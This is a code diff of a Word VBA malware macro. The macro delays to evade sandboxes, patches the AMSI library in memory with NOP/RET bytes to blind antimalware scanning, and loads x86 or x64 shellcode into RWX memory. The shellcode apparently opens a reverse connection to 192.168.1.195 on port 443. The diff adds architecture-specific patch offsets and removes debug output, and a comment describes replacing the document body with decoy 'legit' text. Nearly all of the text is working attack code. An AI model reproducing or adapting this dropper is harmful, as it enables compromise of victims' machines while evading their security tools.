@@ -30,7 +30,7 @@ Function MyMacro()
  If subtime < 3.5 Then
     Exit Function
  End If
- Dim Is32 As Boolean
+ Dim Is64 As Boolean
  Dim StrFile As String
  Dim check As Boolean
  Dim buf As Variant
@@ -39,14 +39,14 @@ Function MyMacro()
  Dim data As String
  Dim res As LongPtr
  StrFile = Dir("c:\windows\system32\a?s?.d*")
- check = amcheck(StrFile)
  Is64 = arch()
+ check = amcheck(StrFile)
  'This portion to delete document body and replace with auto text (the "legit" content)
  'ActiveDocument.Content.Select
  'Selection.Delete
  'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
  If check Then
-     patch (StrFile)
+     patch StrFile, Is64
  End If
  If Is64 Then
     buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 81, 72, 139, 82, 32, 86, 72, 15, 183, 74, 74, 72, 139, 114, 80, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
@@ -57,11 +57,12 @@ Function MyMacro()
     72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
     255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
  Else
-    buf = Array(232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 15, 183, 74, 38, 49, 255, 139, 114, 40, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 80, 139, 88, 32, 1, 211, 139, 72, 24, 133, 201, 116, 60, 49, 255, _
+    buf = Array(232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 15, 183, 74, 38, 49, 255, 139, 114, 40, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 88, 32, 1, 211, 80, 139, 72, 24, 133, 201, 116, 60, 49, 255, _
     73, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
-    104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 49, 68, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
+    104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 1, 195, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
     106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, _
     94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
+
 End If
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  For counter = LBound(buf) To UBound(buf)
@@ -77,21 +78,33 @@ End Function
         arch = False
     #End If
 End Function
-Function patch(StrFile As String)
+Function patch(StrFile As String, Is64 As Boolean)
 
 Dim lib As LongPtr
 Dim Func_addr As LongPtr
 Dim temp As LongPtr
 Dim old As LongPtr
+Dim off As Integer
 
 lib = getmod(StrFile)
-Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 96
+
+If Is64 Then
+    off = 96
+Else
+    off = 80
+End If
+Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
 temp = VirtPro(ByVal Func_addr, 32, 64, 0)
 patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
 patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
 temp = VirtPro(ByVal Func_addr, 32, old, 0)
 
-Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 352
+If Is64 Then
+    off = 352
+Else
+    off = 256
+End If
+Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
 temp = VirtPro(ByVal Func_addr, 32, 64, old)
 patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
 patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
@@ -110,16 +123,11 @@ For i = 0 To UBound(hMod)
     szProcessName = String$(50, 0)
     GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
     If Left(szProcessName, 8) = StrFile Then
-        Debug.Print szProcessName
         amcheck = True
    End If
 Next i
-Debug.Print ("amcheck = " & amcheck)
+
 End Function
 Sub test()
  MyMacro
-End Sub
-Sub king()
-    'king function calls the keyboard mapped macro to call test main function
-    Application.Run MacroName:="test"
 End Sub
